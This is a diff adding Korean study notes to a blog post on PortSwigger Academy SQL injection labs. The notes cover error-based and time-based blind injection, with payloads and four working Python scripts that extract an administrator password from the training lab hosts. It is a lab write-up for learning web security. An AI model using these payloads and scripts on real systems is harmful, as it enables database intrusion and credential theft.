@@ -6,7 +6,7 @@ tags: [webhacking, portswigger]
 published: True
 ---
 
-> [[PortSwigger Academy](https://portswigger.net/web-security/learning-paths)] SQL Injection을 수강하고 정리하였습니다.
+> [[PortSwigger Academy SQL Injection](https://portswigger.net/web-security/learning-paths/sql-injection)] 을 수강하고 정리하였습니다.
 {: .prompt-info }
 
 <br><br>
@@ -697,3 +697,334 @@ print(f"Password: {password}")
 알아낸 패스워드로 `administrator` 계정에 로그인하면 문제를 해결할 수 있다.
 
 <br><br>
+
+# #Error-based SQL injection
+
+Error-based SQL 인젝션은 블라인드 컨텍스트에서도 에러 메시지를 사용하여 데이터베이스로부터 민감한 데이터를 추출하거나 추론할 수 있는 경우를 나타낸다. 취약점의 가능성은 데이터베이스의 구성 사항과 발생시킬 수 있는 에러의 종류에 달려있다.
+
+- 애플리케이션이 boolean 표현식의 결과에 따른 특정한 에러 응답을 반환하도록 유도할 수도 있다. 이전 섹션에서 살펴본 조건부 응답과 동일한 방식으로 이를 활용할 수 있다.
+- 쿼리에 의해 반환되는 데이터를 출력하는 에러 메시지를 발생시킬 수도 있다. 이는 블라인드 SQL 인젝션 취약점을 눈에 보이는 취약점으로 효과적으로 전환한다.
+
+<br>
+
+## Exploiting blind SQL injection by triggering conditional errors
+
+몇몇의 애플리케이션은 SQL 쿼리를 수행하나 쿼리가 어떠한 데이터를 반환하는지를 제외하고는 동작을 바꾸지 않기도 한다. 이전 섹션에서의 기술은 동작하지 않을 것인데 이는 다른 boolean 조건을 주입하는 것이 애플리케이션의 응답에 차이를 만들지 않기 때문이다.
+
+<br>
+
+종종 애플리케이션이 SQL 에러를 발생시키는지에 따라 다른 응답을 반환하도록 유도하는 것이 가능하다. 조건이 참일 때 데이터베이스 에러를 발생시키도록 쿼리를 수정할 수 있다. 데이터베이스에서 처리되지 않은 오류가 발생하면 오류 메시지와 같은 애플리케이션 응답에서 차이가 발생하는 경우가 많다. 이는 삽입된 조건의 참거짓 여부를 추론할 수 있도록 해준다.
+
+<br>
+
+```
+xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
+xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
+```
+
+이것이 동작하는 것을 보기 위해서는 위처럼 `TrackingId` 쿠키 값을 포함하여 차례로 요청을 전송한다고 가정해보자. 이러한 입력은 `CASE` 키워드를 사용하여 조건을 테스트하고 어떤 표현식이 참인지에 따라 다른 표현식을 반환한다.
+
+<br>
+
+- 첫 번째 입력에서 `CASE` 표현식은 `'a'`를 평가하고 어떠한 에러도 발생시키지 않는다.
+- 두 번째 입력에서 `1/0`로 평가되어 divide-by-zero 에러를 발생시킨다.
+
+이 에러가 애플리케이션의 응답에 차이를 발생시킨다면, 이를 이용하여 삽입된 조건문이 참이라는 것을 결정할 수 있다.
+
+<br>
+
+`xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a`
+
+이 방법을 사용하여 한 번에 하나의 문자를 테스트함으로써 데이터를 조회할 수 있다.
+
+<br>
+
+## 🚩Lab: Blind SQL injection with conditional errors
+
+우선 메인페이지에 접속하여 포함된 쿠키 값을 살펴보면 `TrackingId`라는 이름의 쿠키가 설정되어 있는 것을 확인할 수 있다.
+
+<br>
+
+쿠키 값을 `bAKMSIzJgUpF1ga9' AND 'a'='b`로 하여 요청을 하면 조건문이 거짓임에도 웹 사이트에 아무런 변화가 발생하지 않는다. 그렇다면 이전 랩에서 진행한 방법으로는 Blind SQL injection을 수행할 수 없다.
+
+<br>
+
+그러나 쿠키 값을 `bAKMSIzJgUpF1ga9' AND 1/0 --`로 하여 요청을 보내면 divide-by-zero 에러가 발생하기에 웹 사이트에서 Internal Server Error를 확인할 수 있다. 이렇게 에러의 발생 유무에 따라 조건문을 추가하여 Error-based SQL 인젝션을 진행해보자.
+
+<br>
+
+`TrackingId=bAKMSIzJgUpF1ga9' AND (SELECT CASE WHEN length(password) <> 1 THEN to_char(1/0) ELSE 'a' END FROM users WHERE username='administrator')='a' --`
+
+우선 패스워드의 길이를 알기 위해서 위와 같은 페이로드를 작성할 수 있다. 만약 패스워드의 길이가 1이 아니라면 `to_char(1/0)`을 수행하여 에러를 발생시킬 것이다. 이렇게 1씩 늘려가며 패스워드의 길이를 알아내는 Python 코드를 작성할 수 있다.
+
+
+<br>
+
+```python
+import requests
+
+url = 'https://0aa900aa038314dd80f6443500f100a4.web-security-academy.net/'
+len = 1
+
+while True:
+    headers={"Cookie": f"TrackingId=bAKMSIzJgUpF1ga9' AND (SELECT CASE WHEN length(password) <> {len} THEN to_char(1/0) ELSE 'a' END FROM users WHERE username='administrator')='a' --"}
+
+    response = requests.get(url, headers=headers)
+    print(len)
+
+    if 'Internal Server Error' in response.text:
+        len += 1
+    else:
+        print(f"Length of password is {len}")
+        break
+```
+
+위의 코드를 실행하면 아래 이미지와 같이 패스워드의 길이가 20인 것을 알아낼 수 있다.
+
+![image](https://github.com/1unaram/1unaram.github.io/assets/37824335/ff458b1e-95ca-40d3-ab54-7641d26509c4)
+
+<br>
+
+`bAKMSIzJgUpF1ga9' AND (SELECT CASE WHEN SUBSTR(password, 1, 1) < 'm' THEN 'a' ELSE to_char(1/0) END FROM users WHERE username='administrator')='a' --`
+
+이제 Oracle의 `SUBSTR` 함수를 이용하여 패스워드를 하나씩 추출해보자. 이 때 divide-by-zero 에러를 발생 시키는 `to_char(1/0)`을 ELSE 문에 넣어 직관적으로 이해하도록 하였다. 이제 페이지가 에러를 발생시키면 조건문이 거짓이라는 것이고, 에러가 발생하지 않으면 조건문이 참이라는 것을 알게 된다. 이 페이로드를 이용하여 Python 코드를 작성하여 패스워드를 추출해보자.
+
+<br>
+
+```python
+import requests
+
+url = 'https://0aa900aa038314dd80f6443500f100a4.web-security-academy.net/'
+password = ""
+
+for i in range(20):
+    low = 32
+    high = 126
+
+    while low+1 < high:
+        mid = (low + high) // 2
+        headers = {
+            "session":"Oeq5rqh6iPiS4v7ax15lHB56gtL1ogwN",
+            "Cookie": f"TrackingId=bAKMSIzJgUpF1ga9' AND (SELECT CASE WHEN SUBSTR(password, {i+1}, 1) < '{chr(mid)}' THEN 'a' ELSE to_char(1/0) END FROM users WHERE username='administrator')='a' --"
+        }
+        response = requests.get(url, headers=headers)
+
+        if "Internal Server Error" in response.text:
+            low = mid
+        else:
+            high = mid
+
+    password += chr(low)
+    print(f"[{i+1}]Temp Password: {password}")
+
+print(f"Password: {password}")
+```
+
+위처럼 코드를 작성할 수 있다. Internal Server Error가 발생하는지에 따른 조건문을 신경써야 한다.
+
+<br>
+
+![image](https://github.com/1unaram/1unaram.github.io/assets/37824335/53c2a9d4-c2c4-41e5-8937-856af26f079c)
+
+코드를 실행하면 쉽게 패스워드를 구할 수 있고, 해당 비밀번호로 administrator 계정에 로그인하면 문제를 해결할 수 있다.
+
+<br>
+
+## Extracting sensitive data via verbose SQL error messages
+
+`Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = '''. Expected char`
+
+때때로 데이터베이스를 잘못 구성하면 자세한 에러 메시지가 나타나는 경우가 있다. 이는 공격자에게 유용한 정보를 제공할 수도 있다. 예를 들어, 위와 같은 에러 메시지는 `id` 파라미터에 싱글 쿼터를 삽입한 후에 발생한다.
+
+<br>
+
+이는 우리의 입력을 사용하여 애플리케이션이 구성한 전체 쿼리를 보여준다. 이 경우 `WHERE` 절 내에 싱글 쿼터로 묶인 문자열을 삽입하고 있음을 알 수 있다. 이는 악의적인 페이로드를 포함한 유효한 쿼리를 만들기 쉽게 만들어준다. 쿼리의 나머지 부분을 주석 처리하면 싱글 쿼터로 인해 구문이 손상되는 것을 막을 수 있다.
+
+<br>
+
+때로는 애플리케이션이 쿼리에 의해 반환된 일부 데이터가 포함된 에러 메시지를 애플리케이션이 생성하도록 유도할 수 있다. 이는 블라인드  SQL 인젝션 취약점을 눈으로 볼 수 있도록 효과적으로 바꿔준다.
+
+<br>
+
+`CAST((SELECT example_column FROM example_table) AS int)`
+
+이를 이루기 위해 `CAST()` 함수를 사용할 수 있다. 이 함수는 하나의 데이터 타입을 다른 것으로 바꿔준다. 예를 들어, 위와 같은 구문을 포함하는 쿼리를 생각해보자.
+
+<br>
+
+`ERROR: invalid input syntax for type integer: "Example data"`
+
+대부분 우리가 읽고자 하는 데이터는 문자열이다. 이를 `int`와 같이 호환되지 않는 않는 데이터 타입으로 변환하는 시도는 위와 비슷한 에러를 발생시킬지도 모른다. 이러한 종류의 쿼리는 문자 제한으로 인해 조건부 응답을 트리거할 수 없는 경우에 유용할 수 있다.
+
+<br>
+
+## 🚩Lab: Visible error-based SQL injection
+
+![image](https://github.com/1unaram/1unaram.github.io/assets/37824335/9d07d167-5ab6-434b-96b8-83a8da931ed0)
+
+이전 랩과 마찬가지로 메인 페이지에서 `TrackingId` 이름의 쿠키 값을 포함하고 있는 것을 확인할 수 있다. 이 쿠키 값이 에러를 발생시키도록 싱글 쿼터 `'` 하나를 뒤에 포함시켜 요청하면 위와 같이 전체 쿼리문을 포함한 에러 메시지를 확인할 수 있다.
+
+<br>
+
+`TrackingId=K2emZe0i0ZYT4WTP' AND CAST((SELECT 1) as int)=1--`
+
+이 에러 메시지를 이용하기 위해 `CAST` 함수를 이용하자. 먼저 `TrackingId` 값을 위와 같이 구성하여 요청을 보내면 오류 메시지 없이 정상적으로 페이지를 불러올 수 있다.
+
+<br>
+
+`TrackingId=K2emZe0i0ZYT4WTP' AND CAST((SELECT password FROM users WHERE username='administrator') as int)=1--`
+
+이제 `users` 테이블에 있는 `administrator` 계정의 패스워드를 구해보자. 위와 같이 쿠키 값을 설정하여 요청을 보내보자.
+
+<br>
+
+![image](https://github.com/1unaram/1unaram.github.io/assets/37824335/a48e736b-dbee-4123-b133-ee01b05a8532)
+
+위와 같은 에러 메시지를 확인할 수 있는데 이는 서버에서 받은 쿠키 값의 문자열을 자르는 것으로 보인다. 페이로드를 짧게 만들어야함을 알 수 있다.
+
+<br>
+
+`TrackingId=' AND CAST((SELECT password FROM users) as int)=1--`
+
+문자열을 짧게 하기 위해 기존의 쿠키 값을 빈칸으로 만들어 요청을 보내보자.
+
+<br>
+
+![image](https://github.com/1unaram/1unaram.github.io/assets/37824335/46c9c668-cbbb-4b78-b897-16ca3118b8aa)
+
+위와 같은 에러 메시지를 확인할 수 있는데 쿼리의 반환 값으로 둘 이상의 데이터를 받아서 에러를 일으킨 것이다. 이를 제한하기 위해 `LIMIT` 키워드를 사용해보자.
+
+<br>
+
+`TrackingId=' AND CAST((SELECT username FROM users LIMIT 1) as int)=1--`
+
+`LIMIT` 키워드를 이용하여 1개의 데이터를 추출하였다.
+
+<br>
+
+![image](https://github.com/1unaram/1unaram.github.io/assets/37824335/b745d178-aca1-4a5f-bb3c-0b9501e39ede)
+
+결과에서 보면 추출한 1개의 데이터의 `username`이 `administrator`라는 것을 확인하였고, 이를 통해 `administrator` 계정이 테이블의 첫 번째 데이터임을 알 수 있다. 따라서 `password` 값도 가장 첫 번째 데이터가 `administrator`의 값일 것이다.
+
+<br>
+
+`TrackingId=' AND CAST((SELECT password FROM users LIMIT 1) as int)=1--`
+
+`LIMIT` 키워드로 1개의 패스워드를 조회하면
+
+<br>
+
+![image](https://github.com/1unaram/1unaram.github.io/assets/37824335/17780dc0-e676-42ad-bc96-eafbcf313b45)
+
+위와 같이 테이블의 첫 번째 데이터인 `administrator` 계정의 password를 획득할 수 있다. 이 값으로 로그인하면 문제를 해결할 수 있다.
+
+<br><br>
+
+# #Exploiting blind SQL injection by triggering time delays
+
+만일 애플리케이션이 SQL 쿼리가 실행될 때 데이터베이스 에러를 포착하고 이를 정상적으로 처리하는 경우, 애플리케이션의 응답에 어떠한 차이도 없을 것이다. 이 말은 조건부 에러를 유도하기 위한 이전의 기술은 소용없다는 의미이다.
+
+<br>
+
+이러한 상황에서 삽입된 조건문이 참인지 거짓인지에 따라 시간 지연을 발생시킴으로써 블라인드 SQL 인젝션을 이용하는 것이 가능하다. SQL 쿼리는 일반적으로 애플리케이션에 의해 동기식으로 처리하므로 SQL 쿼리의 실행을 지연시키는 것은 마찬가지로 HTTP 응답을 지연시킨다. 이는 HTTP 응답을 받기 위해 걸린 시간을 기반으로 삽입된 조건절의 참 거짓 여부를 결정할 수 있다.
+
+<br>
+
+```
+'; IF (1=2) WAITFOR DELAY '0:0:10'--
+'; IF (1=1) WAITFOR DELAY '0:0:10'--
+```
+
+시간 지연을 발생시키는 기술은 사용 중인 데이터베이스의 종류에 따라 특정된다. 예를 들어, Microsoft SQL Server에서 조건문을 테스트하고 표현식이 참인지에 따른 시간 지연을 발생하기 위해 위와 같은 페이로드를 사용할 수 있다.
+
+- 첫 번재 입력은 지연을 발생시키지 않는데, `1=2`가 거짓이기 때문이다.
+- 두 번째 입력은 10초의 지연을 발생시키는데, `1=1`이 참이기 때문이다.
+
+<br>
+
+`'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--`
+
+이 기술을 사용하면 우리는 한 번에 한 문자씩 테스트함으로써 데이터를 조회할 수 있다.
+
+<br>
+
+## 🚩Lab: Blind SQL injection with time delays and information retrieval
+
+이 랩에서는 이전 랩들과 마찬가지로 `TrackingId` 쿠키 값에 SQL 인젝션을 시도하는 문제이다. 그러나 이전 문제들과는 다르게 삽입된 값으로 인해 구성된 SQL문의 결과가 에러를 발생할 때 웹 사이트에 변화를 주지 않는다. 여기서는 Time-based SQL injection을 시도해보자.
+
+<br>
+
+`abc' %3b SELECT CASE WHEN username='administrator' AND length(password) = 1 THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users --`
+
+해당 서비스는 PostgreSQL 데이터베이스를 사용하므로 `pg_sleep()` 함수를 사용하여 페이로드를 구성하였다. `%3b`는 `;`을 url 인코딩 한 값이다. 만약 이 쿠키 값을 포함하여 요청을 보냈을 때 요청에 대한 응답이 오기까지 5초 가량이 소요된다면 이는 조건문인 `length(password) = 1`가 참이라는 것을 알 수 있다. 이를 이용하여 Python 코드를 작성해보자.
+
+<br>
+
+```python
+import requests, time
+
+url = 'https://0af3004e040a35fc82dc7e0300cf0080.web-security-academy.net/'
+len = 1
+
+while True:
+    headers={"Cookie": f"TrackingId=abc' %3b SELECT CASE WHEN username='administrator' AND length(password) = {len} THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users --"}
+
+    start_time = time.time()
+    response = requests.get(url, headers=headers)
+    print(len)
+
+    if time.time() - start_time >= 5:
+        print(f"Length of password is {len}")
+        break
+    else:
+        len += 1
+```
+
+![image](https://github.com/1unaram/1unaram.github.io/assets/37824335/87655709-0211-49d3-b9b1-6db44d2fb638)
+
+코드를 실행하면 위와 같이 패스워드의 길이가 20인 것을 알아낼 수 있다.
+
+<br>
+
+이제 `SUBSTR` 함수를 이용해 20자의 패스워드를 한 자씩 알아내야 한다. 오랜 시도와 시간이 걸리기에 Python 코드로 작성하자.
+
+<br>
+
+```python
+import requests, time
+
+url = 'https://0af3004e040a35fc82dc7e0300cf0080.web-security-academy.net/'
+password = ""
+
+for i in range(20):
+    low = 32
+    high = 126
+
+    while low+1 < high:
+        mid = (low + high) // 2
+        headers = {
+            "session" : "ZEjsXhcRoquKrD1f5mf2fAH8PJTqp8wK",
+            "Cookie": f"TrackingId=abc' %3b SELECT CASE WHEN username='administrator' AND SUBSTR(password, {i+1}, 1) < '{chr(mid)}' THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users --"
+        }
+
+        start_time = time.time()
+        response = requests.get(url, headers=headers)
+
+        if time.time() - start_time >= 5:
+            high = mid
+        else:
+            low = mid
+
+    password += chr(low)
+    print(f"[{i+1}]Temp Password: {password}")
+
+print(f"Password: {password}")
+```
+
+![image](https://github.com/1unaram/1unaram.github.io/assets/37824335/53930651-e0f9-4d59-91ff-44882c16df55)
+
+코드를 실행하면 위와 같이 패스워드를 얻을 수 있고 이를 이용하여 로그인하면 문제를 해결할 수 있다.
+
+<br><br>
+
+# #Exploiting blind SQL injection using out-of-band (OAST) techniques
